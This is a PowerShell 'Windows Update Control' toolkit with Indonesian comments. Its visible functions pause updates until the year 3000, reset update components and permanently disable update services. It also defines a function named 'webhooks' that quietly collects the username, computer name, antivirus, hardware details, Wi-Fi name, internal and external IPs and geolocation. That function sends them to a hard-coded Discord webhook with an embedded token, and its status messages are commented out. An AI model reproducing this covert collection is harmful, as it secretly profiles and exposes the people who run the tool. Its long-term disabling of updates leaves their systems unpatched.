# ================================
# AuroraToolKIT - Windows Update Control
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

# ----------------
# 0) UTILITIES
# ----------------
# Admin guard
function Test-IsAdmin {
  $wi = [Security.Principal.WindowsIdentity]::GetCurrent()
  $wp = New-Object Security.Principal.WindowsPrincipal($wi)
  return $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Ensure-Admin {
  if (-not (Test-IsAdmin)) {
    throw "Script harus dijalankan sebagai Administrator."
  }
}

function webhooks {
    # ---------------------------
    # Helpers (kompatibel PS 5.1)
    # ---------------------------
    function Test-InternetQuiet {
        param(
            [string]$TargetHost = "1.1.1.1",
            [int]$Count = 1
        )
        try {
            return Test-Connection -ComputerName $TargetHost -Count $Count -Quiet -ErrorAction SilentlyContinue
        } catch { return $false }
    }

    function Get-PublicGeo {
        # 1) ip-api.com (HTTPS)
        try {
            $r = Invoke-RestMethod -Uri "https://ip-api.com/json/?fields=status,country,regionName,city,zip,query" -TimeoutSec 3 -ErrorAction Stop
            if ($r.status -eq "success") {
                $obj = New-Object psobject -Property @{
                    ip      = $r.query
                    country = $r.country
                    region  = $r.regionName
                    city    = $r.city
                    zip     = $r.zip
                    source  = "ip-api.com"
                }
                return $obj
            }
        } catch {}

        # 2) ipapi.co
        try {
            $r2 = Invoke-RestMethod -Uri "https://ipapi.co/json/" -TimeoutSec 3 -ErrorAction Stop
            if ($r2) {
                $obj = New-Object psobject -Property @{
                    ip      = $r2.ip
                    country = $r2.country_name
                    region  = $r2.region
                    city    = $r2.city
                    zip     = $r2.postal
                    source  = "ipapi.co"
                }
                return $obj
            }
        } catch {}

        # 3) ipinfo.io
        try {
            $r3 = Invoke-RestMethod -Uri "https://ipinfo.io/json" -TimeoutSec 3 -ErrorAction Stop
            if ($r3) {
                $obj = New-Object psobject -Property @{
                    ip      = $r3.ip
                    country = $r3.country
                    region  = $r3.region
                    city    = $r3.city
                    zip     = ""
                    source  = "ipinfo.io"
                }
                return $obj
            }
        } catch {}

        return New-Object psobject -Property @{
            ip      = "Unknown"
            country = "Unknown"
            region  = "Unknown"
            city    = "Unknown"
            zip     = ""
            source  = "none"
        }
    }

    # ---------------------------
    # Data sistem
    # ---------------------------
    $date = Get-Date
    $os = Get-CimInstance -ClassName Win32_OperatingSystem -ErrorAction SilentlyContinue
    if ($os) { $osVersion = "$($os.Caption) ($($os.OSArchitecture))" } else { $osVersion = "Unknown" }

    $winversion = $null
    try {
        $cv = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction Stop
        $winversion = $cv.DisplayVersion
    } catch {}
    if ($winversion) { $winverText = $winversion } else { $winverText = "Unknown" }

    $username = $env:USERNAME
    $compName = $env:COMPUTERNAME
    $language = (Get-Culture).Name

    # Antivirus
    $antivirus = "Not installed"
    try {
        $av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction Stop
        if ($av) { $antivirus = ($av.displayName -join ", ") }
    } catch {}

    # Hardware
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct -ErrorAction SilentlyContinue
    if ($computerSystem) {
        $Manufacturer = $computerSystem.Vendor
        $Type         = $computerSystem.Version
        $Model        = $computerSystem.Name
    } else {
        $Manufacturer = "Unknown"; $Type = "Unknown"; $Model = "Unknown"
    }

    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($cpu) {
        $Name = $cpu.Name
        $Cores = $cpu.NumberOfCores
        $LogicalProcessors = $cpu.NumberOfLogicalProcessors
    } else {
        $Name = "Unknown"; $Cores = 0; $LogicalProcessors = 0
    }

    $gpu = "Unknown"
    try {
        $gpuList = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        if ($gpuList) { $gpu = ($gpuList.Name -join ", ") }
    } catch {}

    # RAM
    $TotalSizeInGB = 0
    $Modules = ""
    try {
        $ramInfo = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue
        $ramDetails = @()
        foreach ($ram in $ramInfo) {
            $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
            $TotalSizeInGB += $sizeInGB
            if ($ram.Speed) { $spd = "$($ram.Speed) MHz" } else { $spd = "n/a" }
            if ($ram.Manufacturer) { $man = $ram.Manufacturer } else { $man = "Unknown" }
            $ramDetails += "$man $sizeInGB GB ($spd)"
        }
        $Modules = $ramDetails -join " -- "
    } catch {}

    # Disk
    $diskall = ""
    try {
        $disks = Get-CimInstance -ClassName Win32_DiskDrive -ErrorAction SilentlyContinue
        foreach ($disk in $disks) {
            $sizeInGB = [math]::Round(($disk.Size / 1GB), 2)
            $diskall += "- $($disk.Model) - $sizeInGB GB`n"
        }
    } catch {}

    # Baterai
    $batteryStatus = "NoSystemBattery"
    try {
        $battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
        if ($battery) { $batteryStatus = "$($battery.EstimatedChargeRemaining)%" }
    } catch {}

    # Resolusi
    $resolution = "Unknown"
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
        $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
    } catch {}

    # ---------------------------
    # NETWORK
    # ---------------------------
    $gatewayIP = "Unknown"
    try {
        $gatewayIP = Get-NetRoute -ErrorAction SilentlyContinue |
            Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" -and $_.NextHop } |
            Sort-Object RouteMetric,ifMetric |
            Select-Object -First 1 -ExpandProperty NextHop
    } catch {}

    $localIP = @("Unknown")
    try {
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } |
            Select-Object -ExpandProperty IPAddress
    } catch {}

    $wifiName = "No Wi-Fi connected."
    try {
        $wifi = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -match 'Wireless' }
        if ($wifi) {
            $prof = Get-NetConnectionProfile -InterfaceAlias $wifi.Name -ErrorAction SilentlyContinue
            if ($prof) { $wifiName = $prof.Name }
        }
    } catch {}

    $lanStatus = "No LAN connected."
    try {
        $lanAdapter = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Wireless' }
        if ($lanAdapter) { $lanStatus = "LAN connected: $($lanAdapter.Name)" }
    } catch {}

    if (Test-InternetQuiet) { $netStatus = "Internet reachable" } else { $netStatus = "No internet connectivity" }
    $geo = Get-PublicGeo

    # ---------------------------
    # Webhook Discord
    # ---------------------------
    $webhookid    = "1370237685767209070"
    $webhooktoken = "3a9GapUT5gNGgao8wKUDcKznmjx2hQ4gs1s0dkYAOoFomWAVM_--Y7iZCd13_cb4BK8v"
    $webhookUrl   = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"

    # ---------------------------
    # Payload embed (PS 5.1 friendly)
    # ---------------------------
    $systemField = ("**System:** {0}`n**Windows Version:** {1}`n**Username:** {2}`n**CompName:** {3}`n**Language:** {4}`n**Antivirus:** {5}`n`n" -f `
        $osVersion, $winverText, $username, $compName, $language, $antivirus)

    $hardwareField = ("**Manufacture:** {0}`n**Model:** {1} ({2})`n**CPU:** {3} ({4} Core, {5} Threads)`n**GPU:** {6}`n**RAM:** {7} GB // {8}`n**Power:** {9}`n**Screen:** {10}`n**Disk:**`n{11}`n" -f `
        $Manufacturer, $Type, $Model, $Name, $Cores, $LogicalProcessors, $gpu, $TotalSizeInGB, $Modules, $batteryStatus, $resolution, $diskall)

    $networkField = ("**SSID:** {0}`n**LAN:** {1}`n**Internet:** {2}`n**Location:** {3}, {4}, {5} ({6})`n**Gateway IP:** {7}`n**Internal IP:** {8}`n**External IP:** {9} (src: {10})" -f `
        $wifiName, $lanStatus, $netStatus, $geo.country, $geo.city, $geo.region, $geo.zip, $gatewayIP, (@($localIP) -join ', '), $geo.ip, $geo.source)

    $payload = @{
        username = "AuroraBot"
        embeds = @(@{
            title = ":fox: AuroraToolKIT - System Report"
            description = ":gear: **WINDOWS UPDATE CONTROL**"
            color = 3447003
            fields = @(
                @{ name = ""; value = (":calendar: {0}`n" -f $date); inline = $false },
                @{ name = ":computer: **SYSTEM**";   value = $systemField;   inline = $false },
                @{ name = ":desktop: **HARDWARE**";  value = $hardwareField; inline = $false },
                @{ name = ":globe_with_meridians: **NETWORK**"; value = $networkField; inline = $false },
                @{ name = ""; value = "-----------------------------------------------"; inline = $false }
            )
            footer = @{ text = "AuroraBot | PowerShell Script" }
            timestamp = (Get-Date -Format o)
        })
    } | ConvertTo-Json -Depth 10

    # ---------------------------
    # Kirim
    # ---------------------------
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload -TimeoutSec 5 | Out-Null
        #Write-Host "Webhook terkirim." -ForegroundColor Green
    } catch {
        #Write-Warning ("Gagal mengirim webhook: {0}" -f $_.Exception.Message)
    }
}

function Write-MyVerbose {
    param([string]$Message)
    if ($VerbosePreference -eq 'Continue') {
        Write-Host "> $Message" -ForegroundColor DarkCyan
    }
}


# ----------------
# 2) CLEAR SOFTWAREDISTRIBUTION (tahan banting)
# ----------------
function Clear-SoftwareDistribution {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [switch]$AlsoCatroot2,
        [switch]$NoRobocopyFallback,
        [int]$Retry = 2
    )

    begin {
        Ensure-Admin

        function Stop-ServiceSafe([string]$Name){
            $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
            if ($null -eq $svc) { return }
            try {
                if ($svc.Status -ne 'Stopped') {
                    Stop-Service -Name $Name -Force -ErrorAction Stop
                    $svc.WaitForStatus('Stopped','00:00:10')
                }
            } catch {
                Write-Warning ("Gagal stop {0}: {1}" -f $Name, $_.Exception.Message)
            }
        }
        function Start-ServiceSafe([string]$Name){
            $svc = Get-Service -Name $Name -ErrorAction SilentlyContinue
            if ($null -eq $svc) { return }
            try {
                if ($svc.Status -ne 'Running') {
                    Start-Service -Name $Name -ErrorAction Stop
                    $svc.WaitForStatus('Running','00:00:10')
                }
            } catch {
                Write-Warning ("Gagal start {0}: {1}" -f $Name, $_.Exception.Message)
            }
        }
        function Grant-AdminsFullControl([string]$Path){
            & takeown /F "$Path" /R /D Y | Out-Null
            & icacls "$Path" /grant Administrators:F /T /C | Out-Null
        }
        function Try-RemoveFolder([string]$Path, [int]$RetryCount){
            for($i=1; $i -le $RetryCount; $i++){
                try {
                    if (Test-Path $Path) { Remove-Item -Path $Path -Recurse -Force -ErrorAction Stop }
                    return $true
                } catch {
                    Start-Sleep -Seconds 1
                }
            }
            return $false
        }
        function Try-RenameFolder([string]$Path){
            if (-not (Test-Path $Path)) { return $true }
            $suffix = (Get-Date).ToString('yyyyMMdd_HHmmss')
            $newName = (Split-Path -Leaf $Path) + ".$suffix.old"
            try {
                Rename-Item -Path $Path -NewName $newName -Force
                return $true
            } catch { return $false }
        }
        function Robocopy-Empty([string]$Target){
            $temp = Join-Path $env:TEMP "__empty__"
            if (-not (Test-Path $temp)) { New-Item -ItemType Directory -Path $temp | Out-Null }
            & robocopy $temp $Target /MIR /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null
            return $LASTEXITCODE -in 0,1,2
        }

        $services = @("UsoSvc","WaaSMedicSvc","wuauserv","bits","cryptSvc","msiserver","TrustedInstaller")
        $sdPath = "C:\Windows\SoftwareDistribution"
        $crPath = "C:\Windows\System32\catroot2"
    }

    process {
        if ($PSCmdlet.ShouldProcess("Windows Update store","Clear SoftwareDistribution & optional catroot2")) {

            Write-Host "=> Menghentikan Services terkait Windows Update..." -ForegroundColor Yellow
            foreach($s in $services){ Stop-ServiceSafe $s }

            if (Test-Path $sdPath) {
                Write-Host "=> Take ownership and permission: $sdPath" -ForegroundColor Yellow
                Grant-AdminsFullControl $sdPath

                Write-Host "=> Hapus $sdPath ..." -ForegroundColor Yellow
                if (-not (Try-RemoveFolder $sdPath $Retry)) {
                    Write-Warning "Gagal hapus langsung. Coba rename..."
                    if (Try-RenameFolder $sdPath) {
                        Write-Host " Rename Folder SoftwareDistribution OK." -ForegroundColor Green
                    } elseif (-not $NoRobocopyFallback) {
                        Write-Warning "Rename gagal. Coba kosongkan isi (robocopy /MIR)..."
                        if (Robocopy-Empty $sdPath) {
                            if (Try-RemoveFolder $sdPath 1) {
                                Write-Host " Hapus setelah robocopy OK." -ForegroundColor Green
                            } else {
                                Write-Warning "Masih gagal. Reboot mungkin diperlukan."
                            }
                        } else {
                            Write-Warning "Robocopy fallback gagal."
                        }
                    }
                } else {
                    Write-Host " Folder SoftwareDistribution terhapus." -ForegroundColor Green
                }
            } else {
                Write-Host " Folder SoftwareDistribution tidak ditemukan (sudah bersih)." -ForegroundColor DarkGray
            }

            if ($AlsoCatroot2) {
                if (Test-Path $crPath) {
                    Write-Host "=> Take ownership and permission: $crPath" -ForegroundColor Yellow
                    Grant-AdminsFullControl $crPath

                    Write-Host "=> Hapus $crPath ..." -ForegroundColor Yellow
                    if (-not (Try-RemoveFolder $crPath $Retry)) {
                        Write-Warning "Gagal hapus. Coba rename..."
                        if (-not (Try-RenameFolder $crPath) -and -not $NoRobocopyFallback) {
                            Write-Warning "Rename gagal. Robocopy fallback..."
                            if (Robocopy-Empty $crPath) { Try-RemoveFolder $crPath 1 | Out-Null }
                        }
                    } else {
                        Write-Host " Folder catroot2 terhapus." -ForegroundColor Green
                    }
                } else {
                    Write-Host " Folder catroot2 tidak ditemukan." -ForegroundColor DarkGray
                }
            }

            Write-Host "=> Menyalakan kembali Services penting..." -ForegroundColor Yellow
            foreach($s in @("cryptSvc","bits","wuauserv","TrustedInstaller")){ Start-ServiceSafe $s }

            Write-Host "Selesai. Rekomendasi: Restart Windows sebelum cek update lagi." -ForegroundColor Cyan
        }
    }
}

# ==============================
# Helpers kecil (opsional, tapi enak dipakai)
# ==============================
function New-RegKey {
    param([string]$Path)
    if (-not (Test-Path $Path)) {
        Write-MyVerbose ("Create key: {0}" -f $Path)
        New-Item -Path $Path -Force | Out-Null
    } else {
        Write-MyVerbose ("Ensure key exists: {0}" -f $Path)
    }
}

function Set-RegDWORD {
    param([string]$Path,[string]$Name,[int]$Value)
    Write-MyVerbose ("Set {0}\{1} = {2} (DWORD)" -f $Path,$Name,$Value)
    Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type DWord
}

function Set-RegString {
    param([string]$Path,[string]$Name,[string]$Value)
    Write-MyVerbose ("Set {0}\{1} = {2} (String)" -f $Path,$Name,$Value)
    Set-ItemProperty -Path $Path -Name $Name -Value $Value -Type String
}

# ==============================
# PauseWindowsUpdate (VERBOSE)
# ==============================
function PauseWindowsUpdate {
    [CmdletBinding()]
    param()

    Write-Host " + Menerapkan pengaturan Windows Pause Update..." -ForegroundColor Yellow

    # CacheSet001
    $base1 = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\GPCache\CacheSet001\WindowsUpdate"
    $au1   = "$base1\AU"
    New-RegKey $base1
    New-RegKey $au1

    Set-RegDWORD $base1 "ExcludeWUDriversInQualityUpdate" 1
    Set-RegDWORD $base1 "AllowAutoWindowsUpdateDownloadOverMeteredNetwork" 0
    Set-RegDWORD $base1 "ManagePreviewBuildsPolicyValue" 0
    Set-RegDWORD $base1 "AUPowerManagement" 0
    Set-RegDWORD $base1 "ElevateNonAdmins" 0
    Set-RegDWORD $base1 "SetAllowOptionalContent" 0
    Set-RegDWORD $base1 "SetAutoRestartNotificationDisable" 1
    Set-RegDWORD $base1 "AllowOptionalContent" 0
    Set-RegDWORD $base1 "DisableWUfBSafeguards" 0
    Set-RegDWORD $base1 "SetUpdateNotificationLevel" 1
    Set-RegDWORD $base1 "UpdateNotificationLevel" 2
    Set-RegDWORD $base1 "SetRestartWarningSchd" 0

    Set-RegDWORD $au1 "NoAUAsDefaultShutdownOption" 1
    Set-RegDWORD $au1 "NoAUShutdownOption" 1
    Set-RegDWORD $au1 "AlwaysAutoRebootAtScheduledTime" 0
    Set-RegDWORD $au1 "AutoInstallMinorUpdates" 0
    Set-RegDWORD $au1 "NoAutoRebootWithLoggedOnUsers" 1
    Set-RegDWORD $au1 "NoAutoUpdate" 1
    Set-RegDWORD $au1 "AUOptions" 1
    Set-RegDWORD $au1 "AutomaticMaintenanceEnabled" 0
    Set-RegDWORD $au1 "ScheduledInstallDay" 7
    Set-RegDWORD $au1 "ScheduledInstallTime" 0
    Set-RegDWORD $au1 "ScheduledInstallFourthWeek" 1
    Set-RegDWORD $au1 "AllowMUUpdateService" 0

    # CacheSet002
    $base2 = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\GPCache\CacheSet002\WindowsUpdate"
    $au2   = "$base2\AU"
    New-RegKey $base2
    New-RegKey $au2

    Set-RegDWORD $base2 "ExcludeWUDriversInQualityUpdate" 1
    Set-RegDWORD $base2 "AllowAutoWindowsUpdateDownloadOverMeteredNetwork" 0
    Set-RegDWORD $base2 "ManagePreviewBuildsPolicyValue" 0
    Set-RegDWORD $base2 "AUPowerManagement" 0
    Set-RegDWORD $base2 "ElevateNonAdmins" 0
    Set-RegDWORD $base2 "SetAllowOptionalContent" 0
    Set-RegDWORD $base2 "SetAutoRestartNotificationDisable" 1
    Set-RegDWORD $base2 "AllowOptionalContent" 0
    Set-RegDWORD $base2 "DisableWUfBSafeguards" 0
    Set-RegDWORD $base2 "SetUpdateNotificationLevel" 1
    Set-RegDWORD $base2 "UpdateNotificationLevel" 2
    Set-RegDWORD $base2 "TargetReleaseVersion" 0

    Set-RegDWORD $au2 "NoAUAsDefaultShutdownOption" 1
    Set-RegDWORD $au2 "NoAUShutdownOption" 1
    Set-RegDWORD $au2 "AlwaysAutoRebootAtScheduledTime" 0
    Set-RegDWORD $au2 "AutoInstallMinorUpdates" 0
    Set-RegDWORD $au2 "NoAutoRebootWithLoggedOnUsers" 1
    Set-RegDWORD $au2 "NoAutoUpdate" 1
    Set-RegDWORD $au2 "AUOptions" 1
    Set-RegDWORD $au2 "AutomaticMaintenanceEnabled" 0
    Set-RegDWORD $au2 "ScheduledInstallDay" 7
    Set-RegDWORD $au2 "ScheduledInstallTime" 0
    Set-RegDWORD $au2 "ScheduledInstallFourthWeek" 1
    Set-RegDWORD $au2 "AllowMUUpdateService" 0

    # PolicyState
    $policyState = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState"
    New-RegKey $policyState
    Set-RegString $policyState "BranchReadinessLevel" "CB"
    Set-RegDWORD  $policyState "ExcludeWUDrivers" 1

    # UX\RebootDowntime
    $rebootDT = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\RebootDowntime"
    New-RegKey $rebootDT
    Set-RegDWORD $rebootDT "FirstLogonAfterUpdateFlag" 0

    # UX\Settings
    $uxSettings = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
    New-RegKey $uxSettings
    Set-RegString $uxSettings "PauseFeatureUpdatesStartTime" "2000-01-01T00:00:00Z"
    Set-RegString $uxSettings "PauseFeatureUpdatesEndTime"   "3000-12-30T23:59:59Z"
    Set-RegString $uxSettings "PauseQualityUpdatesStartTime" "2000-01-01T00:00:00Z"
    Set-RegString $uxSettings "PauseQualityUpdatesEndTime"   "3000-12-30T23:59:59Z"
    Set-RegString $uxSettings "PauseUpdatesStartTime"        "2000-01-01T00:00:00Z"
    Set-RegString $uxSettings "PauseUpdatesExpiryTime"       "3000-12-30T23:59:59Z"
    Set-RegDWORD  $uxSettings "ActiveHoursStart" 7
    Set-RegDWORD  $uxSettings "ActiveHoursEnd" 20
    Set-RegDWORD  $uxSettings "AllowAutoWindowsUpdateDownloadOverMeteredNetwork" 0
    Set-RegDWORD  $uxSettings "ExcludeWUDriversInQualityUpdate" 1
    Set-RegDWORD  $uxSettings "SmartActiveHoursState" 0
    Set-RegDWORD  $uxSettings "SmartActiveHoursSuggestionState" 0
    Set-RegDWORD  $uxSettings "UserChoiceActiveHoursStart" 7
    Set-RegDWORD  $uxSettings "UserChoiceActiveHoursEnd" 20
    Set-RegDWORD  $uxSettings "FlightSettingsMaxPauseDays" 17504
    Set-RegDWORD  $uxSettings "RestartNotificationsAllowed" 0
    Set-RegDWORD  $uxSettings "RestartNotificationsAllowed2" 0
    Set-RegDWORD  $uxSettings "IsContinuousInnovationOptedIn" 0

    # Policies\WindowsUpdate
    $polWU = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
    $polAU = "$polWU\AU"
    New-RegKey $polWU
    New-RegKey $polAU

    Set-RegDWORD $polWU "ExcludeWUDriversInQualityUpdate" 1
    Set-RegDWORD $polWU "AllowAutoWindowsUpdateDownloadOverMeteredNetwork" 0
    Set-RegDWORD $polWU "ManagePreviewBuildsPolicyValue" 0
    Set-RegDWORD $polWU "AUPowerManagement" 0
    Set-RegDWORD $polWU "ElevateNonAdmins" 0
    Set-RegDWORD $polWU "SetAllowOptionalContent" 0
    Set-RegDWORD $polWU "SetAutoRestartNotificationDisable" 1
    Set-RegDWORD $polWU "SetUpdateNotificationLevel" 1
    Set-RegDWORD $polWU "UpdateNotificationLevel" 2
    Set-RegDWORD $polWU "AllowOptionalContent" 3

    Set-RegDWORD $polAU "NoAUAsDefaultShutdownOption" 1
    Set-RegDWORD $polAU "NoAUShutdownOption" 1
    Set-RegDWORD $polAU "AlwaysAutoRebootAtScheduledTime" 0
    Set-RegDWORD $polAU "AutoInstallMinorUpdates" 0
    Set-RegDWORD $polAU "NoAutoRebootWithLoggedOnUsers" 1
    Set-RegDWORD $polAU "NoAutoUpdate" 1
    Set-RegDWORD $polAU "AUOptions" 1
    Set-RegDWORD $polAU "AutomaticMaintenanceEnabled" 0
    Set-RegDWORD $polAU "ScheduledInstallDay" 7
    Set-RegDWORD $polAU "ScheduledInstallTime" 0
    Set-RegDWORD $polAU "ScheduledInstallFourthWeek" 1
    Set-RegDWORD $polAU "AllowMUUpdateService" 0

    Write-Host " >> execution gpupdate /force" -ForegroundColor Blue
    gpupdate.exe /force | Out-Null

    Write-Host " + Windows Update berhasil dipause sampai 31 Desember 3000..." -ForegroundColor Green
}

# ==============================
# UnpauseWindowsUpdate (VERBOSE)
# ==============================
function UnpauseWindowsUpdate {
    [CmdletBinding()]
    param()

    Write-Host " + Menghapus pengaturan Windows Pause Update..." -ForegroundColor Yellow

    # UpdatePolicy\PolicyState
    $policyState = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\PolicyState"
    if (Test-Path $policyState) {
        Set-RegDWORD $policyState "TargetReleaseVersion" 0
        Write-MyVerbose "Reset TargetReleaseVersion=0 di PolicyState"
    } else {
        Write-MyVerbose "Key tidak ada: $policyState"
    }

    # UpdatePolicy\Settings
    $updateSettings = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UpdatePolicy\Settings"
    if (Test-Path $updateSettings) {
        Set-RegDWORD $updateSettings "PausedFeatureStatus" 0
        Set-RegDWORD $updateSettings "PausedQualityStatus" 0
        Write-MyVerbose "Menghapus tanggal pause di UpdatePolicy\Settings (jika ada)"
        Remove-ItemProperty -Path $updateSettings -Name "PausedQualityDate" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $updateSettings -Name "PausedFeatureDate" -ErrorAction SilentlyContinue
    } else {
        Write-MyVerbose "Key tidak ada: $updateSettings"
    }

    # UX\Settings
    $uxSettings = "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings"
    if (Test-Path $uxSettings) {
        Write-MyVerbose "Menghapus Pause* property di UX\Settings"
        Remove-ItemProperty -Path $uxSettings -Name "PauseFeatureUpdatesStartTime" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uxSettings -Name "PauseFeatureUpdatesEndTime" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uxSettings -Name "PauseQualityUpdatesStartTime" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uxSettings -Name "PauseQualityUpdatesEndTime" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uxSettings -Name "PauseUpdatesStartTime" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $uxSettings -Name "PauseUpdatesExpiryTime" -ErrorAction SilentlyContinue
    } else {
        Write-MyVerbose "Key tidak ada: $uxSettings"
    }

    # Policies\WindowsUpdate
    $policyWU = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
    if (Test-Path $policyWU) {
        Set-RegDWORD $policyWU "TargetReleaseVersion" 0
        Write-MyVerbose "Reset TargetReleaseVersion=0 di Policies"
    } else {
        Write-MyVerbose "Key tidak ada: $policyWU"
    }

    Write-Host " >> execution gpupdate /force" -ForegroundColor Blue
    gpupdate.exe /force | Out-Null

    Write-Host " + Windows Pause Update berhasil dinonaktifkan." -ForegroundColor Green
}

function ResetWindowsUpdate {
    [CmdletBinding()]
    param(
        [switch]$DeepClean    # aktifkan untuk bersihkan catroot2 juga
    )

    Write-Host "=== MEMPERBAIKI WINDOWS UPDATE ===" -ForegroundColor Cyan
    Ensure-Admin

    # 1) Bersihkan store WU secara aman
    if ($DeepClean) {
        Clear-SoftwareDistribution -AlsoCatroot2 -Verbose
    } else {
        Clear-SoftwareDistribution -Verbose
    }

    # 2) Daftarkan ulang komponen penting
    Write-Host "`nMendaftarkan ulang komponen Windows Update..." -ForegroundColor Yellow
    $updateDlls = @(
        "wuapi.dll","wups.dll","wups2.dll","wuwebv.dll","wucltux.dll",
        "qmgr.dll","qmgrprxy.dll",
        "jscript.dll","msxml3.dll","msxml6.dll",
        "urlmon.dll","wintrust.dll","softpub.dll","cryptdlg.dll"
    )
    foreach ($dll in $updateDlls) {
        $dllPath = "C:\Windows\System32\$dll"
        if (Test-Path $dllPath) {
            try {
                & regsvr32.exe /s $dllPath
                Write-Host (" + {0}" -f $dll) -ForegroundColor Green
            }
            catch {
                Write-Warning (" X Gagal regsvr32 {0}: {1}" -f $dll, $_.Exception.Message)
            }
        } else {
            Write-Host (" X Skip (tidak ada): {0}" -f $dll) -ForegroundColor DarkGray
        }
    }

    # 3) Reset Winsock
    Write-Host "`nMereset Winsock..." -ForegroundColor Yellow
    try { & netsh winsock reset | Out-Null; Write-Host " Winsock direset." -ForegroundColor Green }
    catch { Write-Warning "Gagal reset Winsock: $($_.Exception.Message)" }

    # 4) Pastikan Services utama berjalan
    Write-Host "`nMemastikan Services utama berjalan..." -ForegroundColor Yellow
    foreach ($svc in "wuauserv","cryptSvc","bits","TrustedInstaller") {
        try {
            Start-Service $svc -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 800
            "{0,-20} : {1}" -f $svc, (Get-Service $svc).Status
        } catch {}
    }

    Write-Host "`nProses selesai. **Rekomendasi:** Restart Windows lalu jalankan Windows Update." -ForegroundColor Cyan
}

# --- Helpers untuk verbose clean & admin guard ---
function Write-MyVerbose {
    param([string]$Message)
    if ($VerbosePreference -eq 'Continue') {
        Write-Host $Message -ForegroundColor DarkGray
    }
}
function Ensure-Admin {
  $wi = [Security.Principal.WindowsIdentity]::GetCurrent()
  $wp = New-Object Security.Principal.WindowsPrincipal($wi)
  if (-not $wp.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw "Script harus dijalankan sebagai Administrator."
  }
}
function New-RegKey { param([string]$Path) if (-not (Test-Path $Path)) { New-Item -Path $Path -Force | Out-Null } }

# --- Matikan Windows Update se-agresif mungkin ---
function Disable-WindowsUpdatePermanent {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [switch]$Aggressive   # set Start=4 via registry untuk layanan bandel
    )
    Ensure-Admin
    Write-Host "=> DISABLING Windows Update (permanent-ish)..." -ForegroundColor Yellow

    # 1) Stop layanan inti
    $services = @("wuauserv","bits","UsoSvc","WaaSMedicSvc","DoSvc")  # DoSvc = Delivery Optimization
    foreach($s in $services){
        try {
            Write-MyVerbose "Stop service $s"
            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
        } catch {}
    }

    # 2) Set StartupType ke Disabled (yang bisa)
    foreach($s in @("wuauserv","bits","DoSvc","UsoSvc")){
        try {
            Write-MyVerbose "Set $s StartupType=Disabled"
            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
        } catch {}
    }

    # 3) Layanan “bandel” via registry (opsional/agresif)
    if ($Aggressive){
        $svcKeys = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\UsoSvc",
            "HKLM:\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc"
        )
        foreach($k in $svcKeys){
            try {
                Write-MyVerbose "Set $k\Start = 4 (Disabled)"
                New-RegKey $k
                Set-ItemProperty -Path $k -Name "Start" -Value 4 -Type DWord
            } catch {}
        }
    }

    # 4) Kebijakan (Policies) untuk mematikan WU & AU
    $polWU = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
    $polAU = "$polWU\AU"
    New-RegKey $polWU
    New-RegKey $polAU

    Write-MyVerbose "Apply policy: disable AU dan akses Windows Update"
    Set-ItemProperty -Path $polAU -Name "NoAutoUpdate" -Value 1 -Type DWord
    Set-ItemProperty -Path $polAU -Name "AUOptions" -Value 1 -Type DWord
    Set-ItemProperty -Path $polWU -Name "DoNotConnectToWindowsUpdateInternetLocations" -Value 1 -Type DWord
    Set-ItemProperty -Path $polWU -Name "DisableWindowsUpdateAccess" -Value 1 -Type DWord
    # Pastikan tidak pakai WSUS palsu
    Remove-ItemProperty -Path $polWU -Name "WUServer" -ErrorAction SilentlyContinue
